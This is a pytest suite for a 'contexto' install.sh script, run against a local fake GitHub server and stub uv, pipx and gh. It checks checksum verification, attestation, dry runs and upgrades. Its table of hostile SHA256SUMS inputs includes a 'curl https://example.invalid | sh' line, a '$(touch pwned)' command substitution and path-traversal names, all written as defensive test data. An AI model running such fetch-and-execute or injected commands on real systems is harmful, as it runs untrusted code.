"""install.sh, run against a local server that plays GitHub and stub uv, pipx and gh.

Nothing here reaches the network or installs anything: the script's base URL points at a server on
127.0.0.1, HOME and TMPDIR are temporary directories, and PATH holds only the stubs and the few
system tools the script is allowed to use.
"""

from __future__ import annotations

import hashlib
import os
import re
import shutil
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
SCRIPT = ROOT / "install.sh"
README = ROOT / "README.md"

SH = "/bin/sh"
SHELLS = [SH] + [path for name in ("dash", "bash") if (path := shutil.which(name))]

# Every external command install.sh may run, besides uv, pipx, gh, python and contexto. A command
# outside this list is "not found" under the test PATH, so the list is checked by every test.
SCRIPT_TOOLS = ("curl", "mktemp", "rm", "awk", "cat")
SHA_TOOLS = ("sha256sum", "shasum")
STUB_TOOLS = ("basename", "mkdir", "cp", "ln")

UV_STUB = r"""#!/bin/sh
echo "uv $*" >> "$STUB_STATE/calls.log"
bin=$STUB_BIN
case "${1-} ${2-}" in
"tool list")
    for f in "$STUB_STATE"/uv/*; do
        [ -e "$f" ] || continue
        echo "$(basename "$f") v$(cat "$f")"
        echo "- contexto"
    done ;;
"tool dir") echo "$bin" ;;
"tool uninstall")
    [ -e "$STUB_STATE/uv/$3" ] || { echo "error: \`$3\` is not installed" >&2; exit 2; }
    rm "$STUB_STATE/uv/$3"
    # Measured with uv 0.13.5: uninstall removes the executable whichever tool owns it now.
    rm -f "$bin/contexto" "$STUB_STATE/owner" ;;
"tool install")
    shift 2; force=0; wheel=
    while [ $# -gt 0 ]; do
        case $1 in --force) force=1 ;; --python) shift ;; *) wheel=$1 ;; esac
        shift
    done
    [ -f "$wheel" ] || { echo "error: no wheel at $wheel" >&2; exit 2; }
    [ -z "${STUB_INSTALL_FAIL-}" ] || { echo "error: stub install failure" >&2; exit 2; }
    name=$(basename "$wheel")
    case $name in
        contexto_proxy-*) dist=contexto-proxy; v=${name#contexto_proxy-} ;;
        *) dist=contexto; v=${name#contexto-} ;;
    esac
    v=${v%%-*}
    owner=$(cat "$STUB_STATE/owner" 2>/dev/null || true)
    if [ -e "$bin/contexto" ] && [ "$owner" != "uv:$dist" ] && [ "$force" = 0 ]; then
        echo "error: Executable already exists: contexto (use \`--force\` to overwrite)" >&2
        exit 2
    fi
    mkdir -p "$STUB_STATE/uv" "$bin"
    cp "$wheel" "$STUB_STATE/installed.whl"
    echo "$v" > "$STUB_STATE/uv/$dist"
    ln -sf "$STUB_CONTEXTO" "$bin/contexto"
    echo "$v" > "$bin/contexto.version"
    echo "uv:$dist" > "$STUB_STATE/owner" ;;
*) echo "uv stub: unexpected arguments: $*" >&2; exit 2 ;;
esac
"""

PIPX_STUB = r"""#!/bin/sh
echo "pipx $*" >> "$STUB_STATE/calls.log"
bin=$STUB_BIN
case "${1-}" in
list)
    for f in "$STUB_STATE"/pipx/*; do
        [ -e "$f" ] || continue
        echo "$(basename "$f") $(cat "$f")"
    done ;;
environment)
    [ -z "${STUB_PIPX_NO_ENVIRONMENT-}" ] || { echo "pipx: unknown command" >&2; exit 2; }
    case "${3-}" in
        PIPX_DEFAULT_PYTHON) echo "$STUB_PIPX_PYTHON" ;;
        PIPX_BIN_DIR) echo "$bin" ;;
        *) exit 2 ;;
    esac ;;
uninstall)
    [ -e "$STUB_STATE/pipx/$2" ] || { echo "Nothing to uninstall for $2" >&2; exit 1; }
    rm "$STUB_STATE/pipx/$2"
    # Measured with pipx 1.18.4: uninstall leaves a link that another install owns.
    if [ "$(cat "$STUB_STATE/owner" 2>/dev/null || true)" = "pipx:$2" ]; then
        rm -f "$bin/contexto" "$STUB_STATE/owner"
    fi ;;
install)
    shift; force=0; wheel=
    while [ $# -gt 0 ]; do
        case $1 in --force) force=1 ;; --python) shift ;; *) wheel=$1 ;; esac
        shift
    done
    [ -f "$wheel" ] || { echo "no wheel at $wheel" >&2; exit 1; }
    [ -z "${STUB_INSTALL_FAIL-}" ] || { echo "stub install failure" >&2; exit 1; }
    name=$(basename "$wheel")
    case $name in
        contexto_proxy-*) dist=contexto-proxy; v=${name#contexto_proxy-} ;;
        *) dist=contexto; v=${name#contexto-} ;;
    esac
    v=${v%%-*}
    mkdir -p "$STUB_STATE/pipx" "$bin"
    # Measured with pipx 1.18.4: both of these leave the old command in place and exit 0.
    if [ -e "$STUB_STATE/pipx/$dist" ] && [ "$force" = 0 ]; then
        echo "'$dist' already seems to be installed. Not modifying existing installation"
        exit 0
    fi
    cp "$wheel" "$STUB_STATE/installed.whl"
    echo "$v" > "$STUB_STATE/pipx/$dist"
    owner=$(cat "$STUB_STATE/owner" 2>/dev/null || true)
    if [ -e "$bin/contexto" ] && [ "$owner" != "pipx:$dist" ] && [ "$force" = 0 ]; then
        echo "- contexto (symlink missing or pointing to unexpected location)"
        exit 0
    fi
    ln -sf "$STUB_CONTEXTO" "$bin/contexto"
    echo "$v" > "$bin/contexto.version"
    echo "pipx:$dist" > "$STUB_STATE/owner" ;;
*) echo "pipx stub: unexpected arguments: $*" >&2; exit 2 ;;
esac
"""

GH_STUB = r"""#!/bin/sh
echo "gh $*" >> "$STUB_STATE/calls.log"
if [ "${STUB_GH_EXIT:-0}" != 0 ]; then
    echo "gh stub: verification failed" >&2
fi
exit "${STUB_GH_EXIT:-0}"
"""

# The installed command: a link to this file, which prints the version written next to the link.
CONTEXTO_STUB = '#!/bin/sh\necho "contexto $(cat "$0.version")"\n'

STUBS = {
    "uv": UV_STUB,
    "pipx": PIPX_STUB,
    "gh": GH_STUB,
    "contexto": CONTEXTO_STUB,
    "python-new": "#!/bin/sh\nexit 0\n",  # answers the script's version check: 3.12 or later
    "python-old": "#!/bin/sh\nexit 1\n",
}


def wheel_name(version: str, dist: str = "contexto") -> str:
    return f"{dist.replace('-', '_')}-{version}-py3-none-any.whl"


def sdist_name(version: str, dist: str = "contexto") -> str:
    return f"{dist.replace('-', '_')}-{version}.tar.gz"


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


class Hub:
    """A server on 127.0.0.1 that answers like github.com does for one repository's releases."""

    def __init__(self):
        self.releases: dict[str, dict[str, bytes]] = {}
        self.latest: str | None = None
        self.requests: list[str] = []
        hub = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *args):
                pass

            def do_GET(self):
                hub.requests.append(self.path)
                status, headers, body = hub.answer(self.path, "http://" + self.headers["Host"])
                self.send_response(status)
                for key, value in headers.items():
                    self.send_header(key, value)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                if self.command != "HEAD":
                    self.wfile.write(body)

            do_HEAD = do_GET

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.root = f"http://127.0.0.1:{self.server.server_address[1]}"
        self.url = self.root + "/owner/repo"
        threading.Thread(target=self.server.serve_forever, kwargs={"poll_interval": 0.02}, daemon=True).start()

    def answer(self, path: str, origin: str):
        base = "/owner/repo"
        if path == base + "/releases/latest":
            # GitHub answers 302 to the tag page, or to the release list when there is no release.
            target = f"{origin}{base}/releases/tag/{self.latest}" if self.latest else f"{origin}{base}/releases"
            return 302, {"Location": target}, b""
        if path == base + "/releases" or path.startswith(base + "/releases/tag/"):
            return 200, {"Content-Type": "text/html"}, b"<html>release page</html>"
        download = re.fullmatch(re.escape(base) + r"/releases/download/([^/]+)/([^/]+)", path)
        if download and download[2] in self.releases.get(download[1], {}):
            # GitHub redirects an asset download to another host; here, to another path.
            return 302, {"Location": f"{origin}/blob/{download[1]}/{download[2]}"}, b""
        blob = re.fullmatch(r"/blob/([^/]+)/([^/]+)", path)
        if blob and blob[2] in self.releases.get(blob[1], {}):
            return 200, {"Content-Type": "application/octet-stream"}, self.releases[blob[1]][blob[2]]
        return 404, {"Content-Type": "text/plain"}, b"Not Found"

    def add(self, version: str, dist: str = "contexto", *, sums: str | None | bool = True, latest: bool = True):
        """Publish a release. `sums` is True for the real file, False for none, or the file's text."""
        wheel = f"wheel bytes of {dist} {version}".encode()
        sdist = f"sdist bytes of {dist} {version}".encode()
        assets = {wheel_name(version, dist): wheel, sdist_name(version, dist): sdist}
        if sums is True:
            sums = "".join(f"{sha256(data)}  {name}\n" for name, data in sorted(assets.items()))
        if sums is not False:
            assets["SHA256SUMS"] = sums.encode()
        self.releases[f"v{version}"] = assets
        if latest:
            self.latest = f"v{version}"
        return wheel

    def downloads(self, suffix: str) -> list[str]:
        return [path for path in self.requests if path.startswith("/owner/repo/releases/download/") and
                path.endswith(suffix)]

    def close(self):
        self.server.shutdown()
        self.server.server_close()


class Box:
    """One machine as install.sh sees it: a PATH of stubs, a home directory, and a fake GitHub."""

    def __init__(self, tmp: Path, hub: Hub, stub_files: dict[str, Path], *, tools=("uv", "pipx", "gh"),
                 sha=SHA_TOOLS):
        self.hub = hub
        self.stub_files = stub_files
        self.home = tmp / "home"
        self.state = tmp / "state"
        self.bin = tmp / "tool-bin"
        self.stubs = tmp / "stubs"
        self.system = tmp / "system"
        self.tmpdir = tmp / "tmp"
        for path in (self.home, self.state, self.bin, self.stubs, self.system, self.tmpdir):
            path.mkdir()
        (self.home / ".contexto").mkdir()
        (self.home / ".contexto" / "session.json").write_text("kept")
        for name in (*SCRIPT_TOOLS, *STUB_TOOLS):
            self.link_system(name)
        linked = [name for name in sha if self.link_system(name, required=False)]
        assert linked or not sha, "the test machine has neither sha256sum nor shasum"
        for name in tools:
            self.stub(name, name)
        self.old_python = stub_files["python-old"]
        self.new_python = stub_files["python-new"]
        self.env = {
            "PATH": os.pathsep.join(map(str, (self.bin, self.stubs, self.system))),
            "HOME": str(self.home),
            "TMPDIR": str(self.tmpdir),
            "CONTEXTO_INSTALL_BASE_URL": hub.url,
            "STUB_STATE": str(self.state),
            "STUB_BIN": str(self.bin),
            "STUB_CONTEXTO": str(stub_files["contexto"]),
            "STUB_PIPX_PYTHON": str(self.new_python),
        }

    def link_system(self, name: str, required: bool = True) -> bool:
        found = shutil.which(name)
        if not found:
            assert not required, f"{name} is needed by the tests and is not on PATH"
            return False
        (self.system / name).symlink_to(found)
        return True

    def stub(self, name: str, kind: str) -> Path:
        """Put one of the shared stub files on PATH under `name`."""
        path = self.stubs / name
        path.symlink_to(self.stub_files[kind])
        return path

    def command(self, version: str):
        """A `contexto` command in the tools' bin directory that reports that version."""
        link = self.bin / "contexto"
        if not link.is_symlink():
            link.symlink_to(self.stub_files["contexto"])
        (self.bin / "contexto.version").write_text(version + "\n")

    def preinstall(self, tool: str, dist: str, version: str):
        """The state a real `uv tool install` or `pipx install` of that release leaves behind."""
        (self.state / tool).mkdir(exist_ok=True)
        (self.state / tool / dist).write_text(version + "\n")
        self.command(version)
        (self.state / "owner").write_text(f"{tool}:{dist}\n")

    def run(self, *args: str, shell: str = SH, how: str = "path", script: Path = SCRIPT, **env: str):
        full_env = {**self.env, **env}
        if how == "path":
            return subprocess.run([shell, str(script), *args], env=full_env, capture_output=True, text=True,
                                  stdin=subprocess.DEVNULL, timeout=60)
        command = [shell, "-s", "--", *args] if args else [shell]
        if how == "stdin":  # sh < install.sh
            with open(script, "rb") as source:
                return subprocess.run(command, env=full_env, capture_output=True, text=True, stdin=source,
                                      timeout=60)
        assert how == "pipe"  # cat install.sh | sh
        cat = subprocess.Popen(["cat", str(script)], stdout=subprocess.PIPE)
        try:
            return subprocess.run(command, env=full_env, capture_output=True, text=True, stdin=cat.stdout,
                                  timeout=60)
        finally:
            cat.stdout.close()
            cat.wait()

    def calls(self) -> list[str]:
        log = self.state / "calls.log"
        return log.read_text().splitlines() if log.exists() else []

    def changes(self) -> list[str]:
        """The stub calls that install or remove something, in order."""
        return [call for call in self.calls()
                if call.startswith(("uv tool install", "uv tool uninstall", "pipx install", "pipx uninstall"))]

    def installed(self) -> dict[str, str]:
        found = {}
        for tool in ("uv", "pipx"):
            for path in sorted((self.state / tool).glob("*")) if (self.state / tool).is_dir() else ():
                found[f"{tool}:{path.name}"] = path.read_text().strip()
        return found

    def command_version(self) -> str | None:
        command = self.bin / "contexto"
        if not command.exists():
            return None
        return subprocess.run([str(command), "--version"], env=self.env, capture_output=True,
                              text=True).stdout.strip()

    def assert_untouched(self):
        """No install or uninstall ran, no temporary directory is left, session data is as it was."""
        assert self.changes() == []
        assert list(self.tmpdir.iterdir()) == []
        assert (self.home / ".contexto" / "session.json").read_text() == "kept"
        assert sorted(path.name for path in self.home.iterdir()) == [".contexto"]


@pytest.fixture
def hub():
    server = Hub()
    yield server
    server.close()


@pytest.fixture(scope="session")
def stub_files(tmp_path_factory) -> dict[str, Path]:
    """The stub executables, written once: macOS checks every new executable the first time it runs,
    which costs a few tenths of a second each, so the tests link these and never write their own."""
    directory = tmp_path_factory.mktemp("install-stubs")
    files = {}
    for name, text in STUBS.items():
        files[name] = directory / name
        files[name].write_text(text)
        files[name].chmod(0o755)
    return files


@pytest.fixture
def make_box(tmp_path, hub, stub_files):
    def make(**kwargs) -> Box:
        return Box(tmp_path, hub, stub_files, **kwargs)

    return make


@pytest.fixture
def box(make_box) -> Box:
    return make_box()


def ok(result: subprocess.CompletedProcess) -> subprocess.CompletedProcess:
    assert result.returncode == 0, f"exit {result.returncode}\nstdout:\n{result.stdout}\nstderr:\n{result.stderr}"
    return result


def failed(result: subprocess.CompletedProcess, *needles: str) -> subprocess.CompletedProcess:
    assert result.returncode != 0, f"expected a failure\nstdout:\n{result.stdout}\nstderr:\n{result.stderr}"
    for needle in needles:
        assert needle in result.stderr, f"{needle!r} not in stderr:\n{result.stderr}"
    return result


# --- Finding and installing a release ---


@pytest.mark.parametrize("shell", SHELLS)
def test_latest_release_is_found_verified_and_installed_with_uv(box, shell):
    wheel = box.hub.add("1.2.3")
    result = ok(box.run(shell=shell))
    assert "Latest release: v1.2.3" in result.stdout
    assert "Verified contexto-1.2.3-py3-none-any.whl" in result.stdout
    assert sha256(wheel) in result.stdout
    assert result.stdout.rstrip().splitlines()[-1] == "contexto 1.2.3"
    changes = box.changes()
    assert len(changes) == 1 and changes[0].startswith("uv tool install --python >=3.12 ")
    assert changes[0].endswith("/contexto-1.2.3-py3-none-any.whl")
    assert (box.state / "installed.whl").read_bytes() == wheel
    assert box.installed() == {"uv:contexto": "1.2.3"}
    assert list(box.tmpdir.iterdir()) == [], "the temporary directory is removed on exit"
    assert box.hub.requests[0] == "/owner/repo/releases/latest"


def test_the_wheel_is_installed_from_a_private_temporary_directory(box):
    box.hub.add("1.2.3")
    ok(box.run())
    wheel_path = Path(box.changes()[0].split()[-1])
    assert wheel_path.parent.parent == box.tmpdir
    assert wheel_path.parent.name.startswith("contexto-install.")


def test_pipx_is_used_when_uv_is_absent(make_box):
    box = make_box(tools=("pipx", "gh"))
    box.hub.add("1.2.3")
    result = ok(box.run())
    assert box.changes() == [f"pipx install {box.tmpdir}/{_tmp_name(box)}/contexto-1.2.3-py3-none-any.whl"]
    assert box.installed() == {"pipx:contexto": "1.2.3"}
    assert result.stdout.rstrip().splitlines()[-1] == "contexto 1.2.3"


def _tmp_name(box: Box) -> str:
    """The script's temporary directory name, read back from the install call."""
    return Path(box.changes()[-1].split()[-1]).parent.name


def test_neither_uv_nor_pipx_installs_nothing_and_says_how_to_get_one(make_box):
    box = make_box(tools=("gh",))
    box.hub.add("1.2.3")
    result = failed(box.run(), "neither uv nor pipx is on PATH", "Nothing was installed",
                    "https://docs.astral.sh/uv/", "https://pipx.pypa.io/")
    assert result.returncode == 1
    box.assert_untouched()
    assert box.hub.requests == [], "nothing is downloaded when nothing can be installed"


@pytest.mark.parametrize("with_tool", ["uv", "pipx"])
def test_with_forces_the_installer(box, with_tool):
    box.hub.add("1.2.3")
    ok(box.run("--with", with_tool))
    assert box.installed() == {f"{with_tool}:contexto": "1.2.3"}


def test_with_a_tool_that_is_missing_or_unknown_fails(make_box):
    box = make_box(tools=("uv",))
    box.hub.add("1.2.3")
    failed(box.run("--with", "pipx"), "pipx is not on PATH")
    assert failed(box.run("--with", "pip"), "--with takes uv or pipx").returncode == 2
    box.assert_untouched()


def test_an_existing_pipx_install_is_upgraded_with_pipx_even_when_uv_is_present(box):
    box.preinstall("pipx", "contexto", "1.2.2")
    box.hub.add("1.2.3")
    ok(box.run())
    assert box.installed() == {"pipx:contexto": "1.2.3"}
    assert box.command_version() == "contexto 1.2.3"


@pytest.mark.parametrize("argument", ["v1.2.2", "1.2.2"])
def test_version_option_installs_that_release_not_the_latest(box, argument):
    box.hub.add("1.2.2")
    box.hub.add("1.2.3")
    result = ok(box.run("--version", argument))
    assert box.installed() == {"uv:contexto": "1.2.2"}
    assert "/owner/repo/releases/latest" not in box.hub.requests
    assert result.stdout.rstrip().splitlines()[-1] == "contexto 1.2.2"


def test_version_can_come_from_the_environment_or_an_equals_sign(box):
    box.hub.add("1.2.2")
    box.hub.add("1.2.3")
    ok(box.run(CONTEXTO_VERSION="v1.2.2"))
    assert box.installed() == {"uv:contexto": "1.2.2"}
    ok(box.run("--version=1.2.3", CONTEXTO_VERSION="v1.2.2"))
    assert box.installed() == {"uv:contexto": "1.2.3"}, "the option wins over the environment"


@pytest.mark.parametrize("bad", ["latest", "1.2", "v1.2.3.4", "1.2.x", "v1.2.3/../x", "1..3", "", "1.2.3 4"])
def test_a_version_that_is_not_three_numbers_is_refused(box, bad):
    box.hub.add("1.2.3")
    result = failed(box.run("--version", bad))
    assert result.returncode == 2
    box.assert_untouched()
    assert box.hub.requests == []


def test_a_release_that_does_not_exist_fails_clearly(box):
    box.hub.add("1.2.3")
    failed(box.run("--version", "9.9.9"), "v9.9.9", "SHA256SUMS")
    box.assert_untouched()


def test_no_release_at_all_fails_clearly(box):
    failed(box.run(), "releases/latest")
    box.assert_untouched()


@pytest.mark.parametrize("dist", ["contexto", "contexto-proxy"])
def test_old_and_new_wheel_names_both_install(box, dist):
    wheel = box.hub.add("2.0.0", dist)
    result = ok(box.run())
    assert f"Verified {wheel_name('2.0.0', dist)}" in result.stdout
    assert box.installed() == {f"uv:{dist}": "2.0.0"}
    assert (box.state / "installed.whl").read_bytes() == wheel


# --- The checksum file is untrusted ---


def test_checksum_mismatch_aborts_before_any_install_command(box):
    box.preinstall("uv", "contexto", "1.2.2")
    box.hub.add("1.2.3")
    name = wheel_name("1.2.3")
    box.hub.releases["v1.2.3"][name] = b"not the bytes the checksum was made from"
    failed(box.run(), "SHA-256 mismatch", "Nothing was installed")
    box.assert_untouched()
    assert box.installed() == {"uv:contexto": "1.2.2"}, "the old install is not removed"
    assert box.command_version() == "contexto 1.2.2"


GOOD = "a" * 64
HOSTILE_SUMS = {
    "path traversal": f"{GOOD}  ../../contexto-1.2.3-py3-none-any.whl\n",
    "absolute path": f"{GOOD}  /tmp/contexto-1.2.3-py3-none-any.whl\n",
    "subdirectory": f"{GOOD}  dist/contexto-1.2.3-py3-none-any.whl\n",
    "wrong version": f"{GOOD}  contexto-1.2.4-py3-none-any.whl\n",
    "wrong version, new name": f"{GOOD}  contexto_proxy-9.0.0-py3-none-any.whl\n",
    "two wheels": f"{GOOD}  contexto-1.2.3-py3-none-any.whl\n{GOOD}  contexto_proxy-1.2.3-py3-none-any.whl\n",
    "same wheel twice": f"{GOOD}  contexto-1.2.3-py3-none-any.whl\n{'b' * 64}  contexto-1.2.3-py3-none-any.whl\n",
    "extra line": f"{GOOD}  contexto-1.2.3-py3-none-any.whl\n{GOOD}  evil.sh\n",
    "extra text line": f"{GOOD}  contexto-1.2.3-py3-none-any.whl\ncurl https://example.invalid | sh\n",
    "blank line": f"{GOOD}  contexto-1.2.3-py3-none-any.whl\n\n{GOOD}  contexto-1.2.3.tar.gz\n",
    "another platform's wheel": f"{GOOD}  contexto-1.2.3-cp312-cp312-linux_x86_64.whl\n",
    "trailing text after the name": f"{GOOD}  contexto-1.2.3-py3-none-any.whl --force\n",
    "short digest": f"{'a' * 63}  contexto-1.2.3-py3-none-any.whl\n",
    "long digest": f"{'a' * 65}  contexto-1.2.3-py3-none-any.whl\n",
    "digest that is not hex": f"{'g' * 64}  contexto-1.2.3-py3-none-any.whl\n",
    "uppercase digest": f"{'A' * 64}  contexto-1.2.3-py3-none-any.whl\n",
    "one space": f"{GOOD} contexto-1.2.3-py3-none-any.whl\n",
    "binary marker": f"{GOOD} *contexto-1.2.3-py3-none-any.whl\n",
    "carriage return": f"{GOOD}  contexto-1.2.3-py3-none-any.whl\r\n",
    "no wheel": f"{GOOD}  contexto-1.2.3.tar.gz\n",
    "empty": "",
    "html": "<html><body>Sign in</body></html>\n",
    "shell metacharacters": f"{GOOD}  $(touch pwned)\n",
    "glob": f"{GOOD}  *\n",
}


@pytest.mark.parametrize("case", sorted(HOSTILE_SUMS))
def test_a_hostile_checksum_file_is_refused(box, case, tmp_path):
    box.hub.add("1.2.3", sums=HOSTILE_SUMS[case])
    result = failed(box.run(), "SHA256SUMS", "Nothing was installed")
    box.assert_untouched()
    assert box.hub.downloads(".whl") == [], "no wheel is downloaded on the word of a bad checksum file"
    assert "evil" not in result.stderr and "curl https" not in result.stderr, "untrusted lines are not echoed"
    assert not list(tmp_path.rglob("pwned"))


def test_the_real_checksum_file_form_is_accepted_without_a_final_newline(box):
    wheel = box.hub.add("1.2.3", sums=False)
    name = wheel_name("1.2.3")
    box.hub.releases["v1.2.3"]["SHA256SUMS"] = f"{sha256(wheel)}  {name}".encode()
    ok(box.run())
    assert box.installed() == {"uv:contexto": "1.2.3"}


def test_a_release_without_checksums_stops_and_names_the_oldest_release_that_has_them(box):
    box.hub.add("1.2.3", sums=False)
    failed(box.run(), "SHA256SUMS", "v0.5.13", "Nothing was installed")
    box.assert_untouched()
    assert box.hub.downloads(".whl") == []


def test_a_release_older_than_the_first_with_checksums_stops_before_any_download(box):
    box.hub.add("0.5.12", sums=False)
    failed(box.run("--version", "0.5.12"), "v0.5.12 has no SHA256SUMS", "v0.5.13")
    box.assert_untouched()
    assert box.hub.requests == []


def test_no_checksum_tool_stops_the_install(make_box):
    box = make_box(sha=())
    box.hub.add("1.2.3")
    failed(box.run(), "sha256sum", "shasum", "Nothing was installed")
    box.assert_untouched()


@pytest.mark.parametrize("tool", SHA_TOOLS)
def test_either_checksum_tool_alone_is_enough(make_box, tool):
    if not shutil.which(tool):
        pytest.skip(f"{tool} is not on PATH")
    box = make_box(sha=(tool,))
    box.hub.add("1.2.3")
    ok(box.run())
    assert box.installed() == {"uv:contexto": "1.2.3"}


# --- --dry-run, --attest, --help ---


@pytest.mark.parametrize("shell", SHELLS)
def test_dry_run_prints_the_plan_and_changes_nothing(box, shell):
    box.preinstall("uv", "contexto", "1.2.2")
    box.hub.add("1.2.3", "contexto-proxy")
    result = ok(box.run("--dry-run", shell=shell))
    box.assert_untouched()
    assert box.hub.downloads(".whl") == [], "a dry run does not download the wheel"
    out = result.stdout
    assert "Dry run" in out
    assert f"{box.hub.url}/releases/download/v1.2.3/contexto_proxy-1.2.3-py3-none-any.whl" in out
    assert "Would run: uv tool uninstall contexto" in out
    assert "Would run: uv tool install" in out
    assert out.index("uv tool uninstall contexto") < out.index("uv tool install")
    assert box.installed() == {"uv:contexto": "1.2.2"}
    assert box.command_version() == "contexto 1.2.2"


def test_dry_run_with_attest_names_the_check_and_does_not_run_it(box):
    box.hub.add("1.2.3")
    result = ok(box.run("--dry-run", "--attest"))
    assert "gh attestation verify" in result.stdout
    assert not [call for call in box.calls() if call.startswith("gh ")]
    box.assert_untouched()


def test_attest_passes_and_is_checked_before_the_install(box):
    box.hub.add("1.2.3")
    result = ok(box.run("--attest"))
    calls = [call for call in box.calls() if call.startswith(("gh ", "uv tool install"))]
    assert len(calls) == 2
    assert re.fullmatch(r"gh attestation verify \S+/contexto-1\.2\.3-py3-none-any\.whl --repo VentureForgre/contexto",
                        calls[0])
    assert calls[1].startswith("uv tool install")
    assert "Attestation verified" in result.stdout


def test_attest_failing_stops_before_any_install_command(box):
    box.preinstall("uv", "contexto", "1.2.2")
    box.hub.add("1.2.3", "contexto-proxy")
    failed(box.run("--attest", STUB_GH_EXIT="1"), "attestation", "Nothing was installed",
           "gh stub: verification failed")
    box.assert_untouched()
    assert box.installed() == {"uv:contexto": "1.2.2"}


def test_attest_without_gh_stops_before_any_download(make_box):
    box = make_box(tools=("uv", "pipx"))
    box.hub.add("1.2.3")
    failed(box.run("--attest"), "--attest needs gh", "Nothing was installed")
    box.assert_untouched()
    assert box.hub.requests == []


def test_without_attest_the_command_to_check_the_attestation_is_printed(box):
    box.hub.add("1.2.3")
    result = ok(box.run())
    assert not [call for call in box.calls() if call.startswith("gh ")]
    assert ("gh attestation verify contexto-1.2.3-py3-none-any.whl --repo VentureForgre/contexto"
            in result.stdout)


def test_help_documents_every_option_and_variable_and_runs_nothing(box):
    result = ok(box.run("--help"))
    for word in ("--version", "--with", "--attest", "--force", "--dry-run", "--help", "CONTEXTO_VERSION",
                 "CONTEXTO_INSTALL_BASE_URL", "CONTEXTO_HOME", "uv", "pipx", "SHA256SUMS", "3.12"):
        assert word in result.stdout, word
    assert box.calls() == [] and box.hub.requests == []
    assert ok(box.run("-h")).stdout == result.stdout


@pytest.mark.parametrize("arguments", [("--bogus",), ("extra",), ("--version",), ("--with",), ("--end-of-script",),
                                       ("--", "--dry-run")])
def test_an_unknown_or_incomplete_option_is_a_usage_error(box, arguments):
    box.hub.add("1.2.3")
    result = failed(box.run(*arguments))
    assert result.returncode == 2
    assert "--help" in result.stderr
    box.assert_untouched()
    assert box.hub.requests == []


# --- Upgrade and migration ---


@pytest.mark.parametrize("tool", ["uv", "pipx"])
def test_already_up_to_date_does_nothing(make_box, tool):
    box = make_box(tools=(tool,))
    box.preinstall(tool, "contexto", "1.2.3")
    box.hub.add("1.2.3")
    result = ok(box.run())
    assert "contexto 1.2.3 is already installed" in result.stdout
    assert "--force" in result.stdout
    box.assert_untouched()
    assert box.hub.downloads(".whl") == [] and box.hub.downloads("SHA256SUMS") == []


@pytest.mark.parametrize("tool", ["uv", "pipx"])
def test_force_reinstalls_the_same_release(make_box, tool):
    box = make_box(tools=(tool,))
    box.preinstall(tool, "contexto", "1.2.3")
    box.hub.add("1.2.3")
    ok(box.run("--force"))
    changes = box.changes()
    assert len(changes) == 1 and "install" in changes[0] and "--force" in changes[0]
    assert box.installed() == {f"{tool}:contexto": "1.2.3"}


@pytest.mark.parametrize("tool", ["uv", "pipx"])
@pytest.mark.parametrize("dist", ["contexto", "contexto-proxy"])
def test_running_again_upgrades_in_place_under_one_name(make_box, tool, dist):
    box = make_box(tools=(tool,))
    box.preinstall(tool, dist, "1.2.2")
    box.hub.add("1.2.3", dist)
    result = ok(box.run())
    assert box.installed() == {f"{tool}:{dist}": "1.2.3"}
    assert box.command_version() == "contexto 1.2.3"
    assert not [change for change in box.changes() if "uninstall" in change]
    assert result.stdout.rstrip().splitlines()[-1] == "contexto 1.2.3"


@pytest.mark.parametrize("tool,shell", [("uv", shell) for shell in SHELLS] + [("pipx", SH)])
def test_migration_from_the_old_distribution_name(make_box, tool, shell):
    box = make_box(tools=(tool,))
    box.preinstall(tool, "contexto", "1.2.2")
    box.hub.add("2.0.0", "contexto-proxy")
    result = ok(box.run(shell=shell))
    changes = box.changes()
    uninstall = "uv tool uninstall contexto" if tool == "uv" else "pipx uninstall contexto"
    assert changes[0] == uninstall
    assert len(changes) == 2 and "install" in changes[1] and "contexto_proxy-2.0.0" in changes[1]
    assert box.installed() == {f"{tool}:contexto-proxy": "2.0.0"}, "the old install is gone, the new one is there"
    assert box.command_version() == "contexto 2.0.0"
    assert uninstall in result.stdout, "the script says what it removed"
    downloaded = box.hub.requests.index("/owner/repo/releases/download/v2.0.0/contexto_proxy-2.0.0-py3-none-any.whl")
    assert downloaded >= 0, "the wheel was downloaded and verified before anything was removed"
    assert (box.home / ".contexto" / "session.json").read_text() == "kept"


@pytest.mark.parametrize("old_tool,new_tool", [("uv", "pipx"), ("pipx", "uv")])
@pytest.mark.parametrize("dist", ["contexto", "contexto-proxy"])
def test_an_install_made_by_the_other_tool_is_replaced_not_shadowed(box, old_tool, new_tool, dist):
    box.preinstall(old_tool, dist, "1.2.2")
    box.hub.add("2.0.0", "contexto-proxy")
    ok(box.run("--with", new_tool))
    assert box.installed() == {f"{new_tool}:contexto-proxy": "2.0.0"}
    assert box.command_version() == "contexto 2.0.0"


def test_going_back_to_a_release_under_the_old_name_also_works(box):
    box.preinstall("uv", "contexto-proxy", "2.0.0")
    box.hub.add("1.2.3", latest=False)
    box.hub.add("2.0.0", "contexto-proxy")
    ok(box.run("--version", "1.2.3"))
    assert box.installed() == {"uv:contexto": "1.2.3"}
    assert box.command_version() == "contexto 1.2.3"


def test_both_names_installed_at_once_is_cleaned_up_even_when_the_version_matches(box):
    # What `uv tool install --force <new wheel>` over an old install leaves: two tools, one command.
    box.preinstall("uv", "contexto", "1.2.2")
    box.preinstall("uv", "contexto-proxy", "2.0.0")
    box.hub.add("2.0.0", "contexto-proxy")
    ok(box.run())
    assert box.installed() == {"uv:contexto-proxy": "2.0.0"}
    assert box.command_version() == "contexto 2.0.0"


def test_a_failed_install_reports_the_installer_output(box):
    box.hub.add("1.2.3")
    failed(box.run(STUB_INSTALL_FAIL="1"), "uv tool install", "error: stub install failure")
    assert list(box.tmpdir.iterdir()) == []


def test_a_command_the_tools_do_not_own_blocks_uv_and_force_overrides_it(make_box):
    box = make_box(tools=("uv",))
    box.command("0.0.1")
    box.hub.add("1.2.3")
    failed(box.run(), "Executable already exists", "--force")
    ok(box.run("--force"))
    assert box.command_version() == "contexto 1.2.3"


def test_a_shadowing_command_is_reported_after_a_pipx_install(make_box):
    box = make_box(tools=("pipx",))
    box.command("0.0.1")
    box.hub.add("1.2.3")
    result = box.run()
    assert result.returncode != 0
